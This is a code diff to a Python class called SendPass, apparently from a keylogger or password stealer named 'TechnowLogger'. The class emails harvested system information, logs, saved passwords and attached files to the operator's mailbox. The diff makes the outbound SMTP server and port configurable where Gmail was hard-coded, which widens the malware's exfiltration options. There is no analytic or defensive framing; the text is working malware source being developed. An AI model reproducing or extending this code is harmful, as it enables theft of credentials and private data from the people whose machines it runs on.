@@ -19,9 +19,11 @@ from os.path import basename
 #==================================================================
 
 class SendPass:
-    def __init__(self, email, password):
+    def __init__(self, email, password, smtp_server, smtp_port):
         self.email = email
         self.password = password
+        self.smtp_server = smtp_server
+        self.smtp_port = smtp_port
         self.system_info = self.get_system_info()
         self.log = ""
  
@@ -62,7 +64,7 @@ class SendPass:
     def send_mail(self, message):
         try:
             message = "Subject: TechnowLogger Reporting With Saved Password\n\n" + "Report From:\n\n" + self.system_info + "\n\n" + message
-            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
             server.starttls()
             server.login(self.email, self.password)
             server.sendmail(self.email, self.email, message)
@@ -90,7 +92,7 @@ class SendPass:
                         'content-disposition', 'attachment', filename=basename(f) )
                 msg.attach(attachedfile)
 
-            smtp = smtplib.SMTP(host="smtp.gmail.com", port= 587) 
+            smtp = smtplib.SMTP(host=self.smtp_server, port= self.smtp_port) 
             smtp.starttls()
             smtp.login(self.email, self.password)
             smtp.sendmail(self.email, self.email, msg.as_string())
